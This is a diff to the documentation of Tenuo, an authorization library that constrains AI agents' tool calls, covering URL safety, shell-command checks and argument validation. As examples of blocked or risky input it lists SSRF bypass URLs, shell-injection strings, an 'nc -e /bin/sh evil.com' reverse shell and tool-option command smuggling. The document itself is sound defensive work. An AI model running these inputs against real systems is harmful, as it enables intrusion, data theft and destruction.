@@ -9,6 +9,32 @@ description: How to use constraints to scope authority precisely
 
 ---
 
+## Tool arguments must retain their meaning at execution
+
+Structured arguments and a valid proof-of-possession signature do not make an
+argument safe for the program that consumes it. For example, a `kubectl` resource
+name such as `--filename=/tmp/fixture.yaml` can be interpreted as an option rather
+than a name. [CVE-2026-134817's upstream fix](https://github.com/Flux159/mcp-server-kubernetes/pull/390)
+rejects flag-shaped values in positional operand fields.
+
+Use field-specific constraints that describe valid resource names, and enforce
+runtime input validation in the tool handler. A broad wildcard does not provide
+this protection. Reject invalid operands before invoking the executor. Do not
+apply a global ban on dash-prefixed strings: other fields may legitimately
+contain them.
+
+Perform application normalization before signing and authorization, then execute
+the verified arguments without further rewriting. Canonical serialization binds
+the supplied values; it does not model a downstream command's option parser.
+Passing an argument array with `shell=False` or using `execve()` avoids shell
+interpretation but does not stop the executable from interpreting options.
+
+The synthetic MCP boundary tests in
+`tenuo-python/tests/security/test_mcp_argument_boundary.py` exercise explicit
+operand constraints, unchanged argument forwarding, and proof-of-possession
+binding with a recording executor. They do not replace upstream server tests or
+validate a complete Kubernetes input schema.
+
 ## Overview
 
 Constraints are key-value pairs that restrict what a warrant authorizes. When a tool is invoked, Tenuo checks that the arguments satisfy the warrant's constraints.
@@ -132,6 +158,31 @@ api_call(url="https://api.example.com/v1", timeout=30, retries=3)
 
 ---
 
+## Checking a proposed narrowing
+
+Python can check the core's attenuation rules without issuing a warrant:
+
+```python
+from tenuo import Exact, OneOf, validate_attenuation
+
+parent = OneOf(["Paris", "Lyon"])
+validate_attenuation(parent, Exact("Paris"))  # Returns None
+parent.validate_attenuation(Exact("Paris"))  # Same check
+validate_attenuation(parent, Exact("Rome"))  # Raises ValueNotInParentSet
+```
+
+`validate_attenuation(parent, child)` is also available from `tenuo_core`.
+It uses Rust's existing rules and typed exceptions, including cross-type
+narrowing such as `Range` to a numeric `Exact`. Checking is conservative:
+rejection can mean that the core cannot establish containment. A successful
+check covers only the constraint relationship. Warrant issuance and receiving
+boundaries still verify delegation, signatures, trusted roots, expiry,
+revocation, approvals, and proof of possession as applicable.
+
+Scoped `grant()` and its `preview()` use the same native containment check.
+Literal shorthand means `Exact(value)`, including strings containing `*`;
+use an explicit `Pattern` when you intend a glob.
+
 ## Constraint Types
 
 ### Wildcard
@@ -174,7 +225,9 @@ from tenuo import Pattern
 # Suffix wildcard - matches paths starting with /data/
 Pattern("/data/*")
 
-# Prefix wildcard - matches emails ending with @company.com
+# Prefix wildcard - matches any string ending with @company.com
+# Not for recipient fields: * also matches "," ";" "<" and "@", so
+# "eve@evil.com,bob@company.com" matches. Use an anchored Regex there.
 Pattern("*@company.com")
 
 # Middle wildcard - matches specific file in any subdirectory
@@ -261,6 +314,12 @@ Exact("production")
 
 # Only allows this specific ID
 Exact("user-12345")
+
+# Typed literals, including nested values
+Exact(180)
+Exact(True)
+Exact(None)
+Exact({"items": [1, "1", False]})
 ```
 
 ---
@@ -277,9 +336,24 @@ OneOf(["staging", "production", "dev"])
 
 # Allows specific actions
 OneOf(["read", "list"])
+
+# A numeric allowlist does not admit numeric strings or booleans
+OneOf([1, 2, 3])
 ```
 
 ---
+
+Python's `Exact`, `OneOf`, and `NotOneOf` accept strings, signed 64-bit integers,
+floats, booleans, null (`None`), lists, and objects with string keys. Values keep
+their types: `1` differs from `True` and `"1"`. Integer and floating-point
+spellings of the same numeric value compare equally, so `Exact(1)` also matches
+`1.0`. Their `matches`, `contains`, and `allows` convenience methods use the
+same typed checks as `satisfies`.
+
+The shared Python `enforce_tool_call` helpers omit top-level `None` arguments
+and `None` elements in lists from their constraint view. Policies used with
+those helpers must match that normalized view. Native constraint checks and
+`Authorizer` preserve null values.
 
 ### Range
 
@@ -490,7 +564,15 @@ Subpath("/data", allow_equal=False)     # Require strictly under root
 | `Subpath("/data")` | `/etc/passwd` | No |
 | `Subpath("/data")` | `data/file.txt` | No (relative path) |
 
-**Attenuation:** Child root must be contained within parent root.
+`Subpath.matches()` and warrant matching also accept a list of absolute path
+strings. Every item must match; mixed types and nested lists fail. Empty lists
+match, so executors must supply actual implicit paths when callers omit them
+(`tenuo.process` uses the working directory). `contains()` remains a scalar
+path check.
+
+**Attenuation:** Child root must be contained within parent root. A Subpath can
+also narrow to `Subset` of contained path strings or `Exact` of a contained path
+string/list. The same rules apply in Rust, Python, and TypeScript.
 
 ```python
 # Parent: /data
@@ -557,8 +639,8 @@ constraint = UrlSafe(deny_domains=["169.254.169.254"])
 # Custom configuration
 constraint = UrlSafe(
     allow_schemes=["https"],           # HTTPS only
-    block_private=True,                # Block 10.x, 172.16.x, 192.168.x
-    block_loopback=True,               # Block 127.x, ::1, localhost
+    block_private=True,                # Block 10.x, 172.16.x, 192.168.x, 100.64.x, fc00::/7, ...
+    block_loopback=True,               # Block 127.x, ::1, 0.0.0.0, ::, localhost
     block_metadata=True,               # Block cloud metadata endpoints
     block_internal_tlds=True,          # Block .internal, .local, .svc, .default, etc.
 )
@@ -567,10 +649,13 @@ constraint = UrlSafe(
 **Security Features:**
 
 - Validates URL scheme (default: http, https)
-- Blocks private IPs (RFC1918: 10.x, 172.16.x, 192.168.x)
-- Blocks loopback (127.x, ::1, localhost)
+- Blocks private IPs (RFC 1918, RFC 6598 shared space, benchmarking, IPv6 unique-local, link-local and site-local)
+- Blocks loopback (127.x, ::1, localhost) and the unspecified addresses (0.0.0.0, ::)
 - Blocks cloud metadata endpoints (169.254.169.254, metadata.google.internal)
+- Blocks reserved ranges: everything the IANA special-purpose registries mark as not globally reachable, such as multicast, documentation and class E
 - Blocks IP encoding bypasses (decimal, hex, octal, IPv6-mapped)
+- Judges an IPv6 address that carries an IPv4 address (IPv4-mapped, IPv4-compatible, 6to4, NAT64, Teredo) by the IPv4 address too
+- Treats a fully-qualified name (`localhost.`) as the same name as `localhost` for every host policy
 - `deny_domains` explicitly blocks domains/IPs (checked for both hostnames and IPs; deny wins over allow on overlap)
 - Decodes URL-encoded hostnames
 - Optional domain allowlist for maximum restriction
@@ -590,6 +675,10 @@ constraint = UrlSafe(
 | URL Encoded | `http://%31%32%37%2e%30%2e%30%2e%31/` | Yes |
 | File Scheme | `file:///etc/passwd` | Yes |
 | localhost | `http://localhost/` | Yes |
+| Fully-qualified name | `http://localhost./` | Yes |
+| IPv6 unspecified | `http://[::]/` | Yes |
+| 6to4 / NAT64 wrapper | `http://[64:ff9b::a9fe:a9fe]/` (=169.254.169.254) | Yes |
+| Shared address space | `http://100.64.0.1/` | Yes |
 
 **Attenuation:** Child must be at least as restrictive as parent.
 
@@ -607,7 +696,7 @@ child = UrlSafe(block_private=False)  # FAILS
 > [!NOTE]
 > **DNS Resolution**
 >
-> This constraint does NOT perform DNS resolution. This is intentional - DNS resolution is I/O that can block, fail, or be manipulated (DNS rebinding). For DNS-aware validation, use `url_jail` at the execution layer.
+> This constraint does NOT perform DNS resolution. This is intentional - DNS resolution is I/O that can block, fail, or be manipulated (DNS rebinding). `UrlSafe` protects literal IPs and URL/host policy, but the HTTP execution layer must still validate every resolved address (including redirects) and connect to that validated address without resolving the hostname again. For Python, `url_jail` is one execution-layer option.
 
 > [!IMPORTANT]
 > **IPv6 Address Handling**
@@ -615,8 +704,10 @@ child = UrlSafe(block_private=False)  # FAILS
 > UrlSafe blocks several IPv6-based bypass attempts:
 > - **IPv6-mapped IPv4**: `[::ffff:127.0.0.1]` --> blocked (normalized to 127.0.0.1)
 > - **IPv4-compatible IPv6**: `[::127.0.0.1]` --> blocked (deprecated format but still parsed by some libraries)
-> - **IPv6 loopback**: `[::1]` --> blocked
-> - **IPv6 private ranges**: `fc00::/7`, `fe80::/10` --> blocked when `block_private=True`
+> - **IPv6 loopback and unspecified**: `[::1]`, `[::]` --> blocked
+> - **Transition addresses**: 6to4 `2002::/16`, NAT64 `64:ff9b::/96` and Teredo `2001::/32` --> judged by the IPv4 address they carry; local-use NAT64 `64:ff9b:1::/48` --> blocked when `block_private=True`
+> - **IPv6 private ranges**: `fc00::/7`, `fe80::/10`, `fec0::/10` --> blocked when `block_private=True`
+> - **IPv6 reserved ranges**: multicast `ff00::/8`, documentation and other non-global IANA ranges --> blocked when `block_reserved=True`
 
 > [!NOTE]
 > **Octal IP Normalization**
@@ -654,7 +745,10 @@ constraint.is_safe("not-a-url")  # False
 
 ### Shlex
 
-Validates that a shell command string is safe and simple. Ensures the command is a single executable with literal arguments, preventing shell injection.
+Checks a command string against a binary allowlist and a defined subset of POSIX
+shell syntax. Every SDK uses the same core tokenizer for matching, explanations,
+and attenuation. The check does not execute the command, resolve the executable,
+or identify the resources the program will access.
 
 ```python
 from tenuo import Shlex
@@ -665,10 +759,21 @@ constraint = Shlex(allow=["ls", "cat", "grep"])
 constraint.matches("ls -la /tmp")           # True
 constraint.matches("cat file.txt")          # True
 constraint.matches("ls -la; rm -rf /")      # False (operator blocked)
+constraint.matches('ls "foo; bar"')         # True (quoted semicolon is literal)
+Shlex(allow=["echo"]).matches('echo ";"')    # True (a quoted operator is an argument)
+constraint.matches("ls -la # note")         # True (literal # with no operators)
+constraint.matches("ls #; rm")              # False (# is a word character, so ; is still blocked)
+constraint.matches("ls foo#; rm -rf /")     # False (# inside a word does not hide ;)
+constraint.matches("./ls,evil -la")         # False (the command name is ./ls,evil)
 constraint.matches("echo $(whoami)")        # False (command substitution)
+constraint.matches('echo "$HOME"')          # False ($ expands inside double quotes)
 constraint.matches("ls $HOME")              # False (variable expansion)
 constraint.matches("rm -rf /")              # False (rm not in allowlist)
 ```
+
+`#` is an ordinary word character, never a comment, so an operator after `#` is still rejected. Each `allow` entry matches the command word literally: `allow=["ls"]` matches `ls` only (not `/usr/bin/ls`, `./ls`, or `/tmp/attacker/ls`), and any command word containing `..` is rejected.
+
+A quoted or backslash-escaped operator is a literal argument, so `find . -exec rm {} \;` passes this check. `find` still runs the argument. That is the semantic gap in the warning below. `Shlex.check(command)` returns the same decision the warrant uses, including the reason.
 
 **Security Features:**
 
@@ -685,22 +790,31 @@ constraint.matches("rm -rf /")              # False (rm not in allowlist)
 | Unauthorized binary | `nc -e /bin/sh evil.com` | Yes |
 
 > [!NOTE]
-> Glob characters (`*`, `?`, `[`) are allowed. They expand to filenames
-> but are not shell injection vectors. If you need to restrict file
-> access, combine `Shlex` with `Subpath`.
+> Glob characters (`*`, `?`, `[`) are literal arguments to this check. A
+> shell that runs the command may still expand them. Bash may also expand
+> `{a,b,c}`; this check keeps that as one word. If you need to restrict file
+> access, expose explicit path arguments checked with `Subpath` and execute the
+> checked values through a trusted runner.
 
 > [!WARNING]
-> **Tier 1 Mitigation Only**
+> **Syntax checks and execution**
 >
-> Shlex validates **shell syntax**, not **tool semantics**. Some tools interpret arguments as commands:
+> `Shlex` can be used in local policies and signed warrants. Its guarantee covers
+> command syntax and the command word; each program still interprets its own
+> arguments. Some tools interpret arguments as commands:
 >
 > ```python
 > # These pass Shlex but the tool executes the argument:
 > "git clone --upload-pack='malicious' repo"
 > "tar --checkpoint-action=exec=cmd -xf file.tar"
+> "find . -exec rm {} \\;"
 > ```
 >
-> For complete protection, use `proc_jail` which bypasses the shell entirely via `execve()`.
+> For tools that execute commands, prefer structured operations with explicit
+> flags, paths, and working directories, authorize those values, and execute
+> them without a shell. Program-specific execution profiles must account for
+> options and configuration that run other programs. Filesystem or process
+> isolation is needed when the program itself must be confined.
 
 > [!NOTE]
 > **Dangerous Binaries**
@@ -723,6 +837,70 @@ constraint.matches(None)  # False
 # Empty allowlist raises ValueError
 Shlex(allow=[])  # ValueError: Shlex requires at least one allowed binary
 ```
+
+
+#### Running the authorized command
+
+A check on a command string does not fix what runs: the shell expands braces,
+globs and `~` afterwards, and the program reads its own config. For agents that
+run commands, give the tool structured arguments and run them with
+`tenuo.process` (POSIX only):
+
+```python
+from tenuo import OneOf, Subpath, Subset, Warrant
+from tenuo.process import GIT, run, run_command
+
+warrant = (Warrant.mint_builder()
+    .capability("git",
+        subcommand=OneOf(["status", "diff", "log"]),
+        flags=Subset(["--short", "--stat", "--oneline"]),
+        paths=Subpath("/workspace/repo"),
+        cwd=Subpath("/workspace/repo"))
+    .holder(agent_key.public_key).ttl(1800).mint(issuer_key))
+bound = warrant.bind(agent_key)
+
+run(bound, GIT, subcommand="status", flags=["--short"], cwd="/workspace/repo")  # runs
+run(bound, GIT, subcommand="push", cwd="/workspace/repo")                      # AuthorizationDenied
+
+# A tool that takes one string: split once, run that split, never a shell.
+run_command(bound, GIT, "git log --oneline", cwd="/workspace/repo")
+run_command(bound, GIT, "git status && rm -rf ~", cwd="/workspace/repo")      # AuthorizationDenied
+```
+
+- `cwd` and each entry of `paths` (joined to `cwd`, defaulting to `"."` when
+  omitted) are resolved with `realpath` before the check, so a symlink cannot
+  lead outside the `Subpath`. Because `realpath` resolves paths before `execve`
+  rather than pinning file descriptors, the directory ancestry of `cwd` and
+  `paths` must not be writable by concurrent untrusted processes.
+- argv is exactly the checked values, with program-forced safety flags after
+  caller flags and paths after `--`. The environment is fixed by the `Program`;
+  nothing is inherited.
+- The `GIT` profile supports `status`, `diff`, and `log` and requires Git 2.41+.
+  SHA-1 and SHA-256 repositories use their own empty-tree attribute source.
+  This is the executor's supported grammar; the warrant must still authorize
+  every operation and argument. It stops repository config and
+  `.gitattributes` from running programs (`core.fsmonitor`, pagers, external
+  diff, textconv, filters), treats pathspecs literally
+  (`GIT_LITERAL_PATHSPECS=1`), and turns off network transports
+  (`GIT_ALLOW_PROTOCOL=""`). Keep `.git/` out of the agent's file tools, since
+  settings there still apply.
+- Delegation narrows each field: a smaller `OneOf` of subcommands, a smaller
+  `Subset` of flags, a deeper `Subpath`.
+- Other programs: `Program(name="rg", env={...})`. The profile only blocks
+  what it names, so check the program's own options that run code.
+
+The program profile is trusted application configuration. Its environment and
+forced options are copied at construction, and its executable is resolved once
+on first use. Keep the executable and its directory ancestry under trusted
+control. Agents supply the request, not the profile. `run_command` uses the
+shared core tokenizer's successful decision; no second shell parser or shell
+expansion runs between authorization and execution. Program profiles define
+execution semantics, while authorization continues to come from the warrant.
+
+For approval-gated calls, pass collected signed approvals with
+`run(..., approvals=[signed_approval])` (also supported by `run_command`).
+Approvals cover the resolved request, including absolute paths and working
+directory, and are verified by the ordinary warrant authorization path.
 
 ---
 
@@ -790,6 +968,13 @@ NotOneOf(["admin", "root"])
 ```
 
 **Security**: Always prefer `OneOf` (allowlist) over `NotOneOf` (denylist). `NotOneOf` can only appear in root warrants or attenuate from another `NotOneOf` or `Wildcard` parent. Attenuating from `OneOf` to `NotOneOf` is **forbidden** because `NotOneOf` accepts values outside the parent's allowlist. To narrow an `OneOf`, use `OneOf(subset)` instead.
+
+An exclusion list judges only the value kinds represented by its entries.
+`NotOneOf([1])` accepts other numbers, but rejects booleans, strings, null,
+lists, and objects. An empty list judges every supported kind. Non-finite
+numbers do not pass exclusions. Adding an exclusion of a new kind during
+delegation is rejected because it would admit values of that kind that the
+parent rejects.
 
 ---
 
@@ -938,7 +1123,11 @@ CEL("budget < revenue * 0.1 && currency == 'USD'")
 
 **How it works:**
 - CEL expressions evaluate to **boolean** (true/false)
-- For **object values**, each field becomes a top-level variable
+- For **object values**, each field becomes a top-level variable. The whole object is available
+  through the opt-in `tenuo_object()` function. Use `has(tenuo_object().field)` to test an
+  optional field, for example `amount <= 4000 && (!has(tenuo_object().approve) ||
+  tenuo_object().approve == false)`. A field named `value` keeps its existing top-level binding,
+  and list-oriented `value.all(...)` policies continue to reject objects.
 - For **primitive values**, the value is available as `value`
 - Expressions are **compiled once** and cached for performance (max 1000 entries)
 
@@ -1182,7 +1371,7 @@ Some constraint types can contain different types during attenuation:
 | `Wildcard()` | Any type | Universal parent - contains everything |
 | `Pattern("*@co.com")` | `Exact("cfo@co.com")` | Child matches parent glob |
 | `Regex(r"^dev-.*")` | `Exact("dev-web")` | Child matches parent regex |
-| `Range(min=0, max=100)` | `Exact("50")` | Child numeric value within range |
+| `Range(min=0, max=100)` | `Exact(50)` | Child numeric value within range |
 | `Cidr("10.0.0.0/8")` | `Exact("10.1.2.3")` | Child IP within parent network |
 | `Cidr("10.0.0.0/8")` | `Cidr("10.1.0.0/16")` | Child is subnet of parent |
 | `UrlPattern("https://*.example.com/*")` | `Exact("https://api.example.com/v1")` | Child URL matches parent pattern |
@@ -1244,8 +1433,9 @@ child = Regex(r"^staging-web$")     # FAILS - even if semantically narrower
 
 # Range -> Exact: numeric value must be within range
 parent = Range(min=0, max=100)
-child = Exact("50")   # OK - 50 is in [0, 100]
-child = Exact("150")  # FAILS - 150 > 100
+child = Exact(50)     # OK - 50 is in [0, 100]
+child = Exact(150)    # FAILS - 150 > 100
+child = Exact("50")   # FAILS - a string is not a number
 
 # OneOf -> Exact: exact value must be in the set
 parent = OneOf(["read", "write", "delete"])
@@ -1761,7 +1951,8 @@ tools:
 
       environment:
         from: literal        # Static value
-        value: "production"
+        path: ""
+        default: "production"
 
 routes:
   - pattern: "/api/v1/clusters/{cluster}/scale"
@@ -1858,7 +2049,7 @@ routes:
 |-------|------|---------|-------------|
 | `warrant_header` | string | `X-Tenuo-Warrant` | HTTP header containing base64-encoded warrant or WarrantStack |
 | `pop_header` | string | `X-Tenuo-PoP` | HTTP header containing base64-encoded PoP signature |
-| `clock_tolerance_secs` | int | `30` | Seconds of tolerance for expiration checks |
+| `clock_tolerance_secs` | int | `30` | Future-issued timestamp tolerance; expiry is strict |
 | `trusted_roots` | list | `[]` | Hex-encoded public keys of trusted control planes |
 | `debug_mode` | bool | `false` | Enable detailed deny reasons in response headers |
 
@@ -1881,7 +2072,7 @@ routes:
   - pattern: "/api/v1/admin/{action}"
     method: ["POST"]
     tool: "admin_action"
-    extra_constraints:
+    constraints:
       admin_key:
         from: header
         path: "X-Admin-Key"
@@ -1916,3 +2107,56 @@ $ tenuo-authorizer serve --config gateway.yaml
 - [Security](./security): How constraints fit into the security model
 - [LangGraph Integration](./langgraph): Using constraints with LangGraph
 - [Enforcement Architecture](./enforcement): Deployment models and proxy configurations
+
+
+## Optional arguments (Rust core)
+
+A constraint normally requires its argument to be present. Use
+`ConstraintSet::insert_optional` when omission is allowed but a supplied value
+must still satisfy a constraint:
+
+```rust
+use tenuo::{ConstraintSet, Range};
+
+let mut args = ConstraintSet::new();
+args.insert_optional("head", Range::max(200.0)?);
+// {} and {"head": 200} pass; {"head": 201} and {"head": null} fail.
+# Ok::<(), tenuo::Error>(())
+```
+
+`is_optional("head")` reports the presence rule. Calling `insert` for the same
+field makes it required again. `get` and `iter` expose value constraints; use
+`is_optional` as well when inspecting presence rules. Collecting value constraints
+into a new set creates required arguments.
+
+Optionality does not permit undeclared arguments. During delegation, an optional
+argument may become required, but a required argument cannot become optional.
+The value constraint must still narrow. A child may leave an optional argument
+out only when it admits no undeclared arguments (it is not empty and does not
+set `allow_unknown`); the child then refuses that argument. A child may declare
+an argument its parent does not only when the parent admits undeclared
+arguments.
+Unsupported optional parent predicates cannot confer authority through
+delegation, including when a child makes the argument required.
+
+Omission is distinct from explicit null. The engine checks the arguments it is
+given; it does not resolve tool defaults. If a default must satisfy the policy,
+normalize the default into the invocation before authorization and execution.
+Optional declarations still require verifier support for the entire value
+constraint. Unknown types, including those inside composite constraints, and
+CEL constraints on builds without CEL support are rejected even when omitted.
+
+This API is in the shared Rust engine; Python and TypeScript authoring helpers do
+not yet expose optional declarations. CBOR stores a sorted `optional_fields`
+array alongside `constraints`, omitted when empty. Existing required-only
+encodings remain unchanged. Strict older decoders reject the new member; older
+permissive decoders treat the arguments as required. Upgrade verifiers before
+issuing warrants that depend on omission being accepted.
+
+Python and TypeScript receivers preserve supplied values for optional fields
+throughout the presented chain, including explicit nulls and nulls inside lists.
+Required-only fields retain the SDK's existing null normalization. In Python,
+`warrant.optional_fields(tool)` reports the signed presence declarations for the
+effective tool entry, using the same exact-tool precedence and wildcard fallback
+as authorization. For issuer warrants, it reports optional constraint bounds only
+when the tool is issuable, including wildcard issuance.
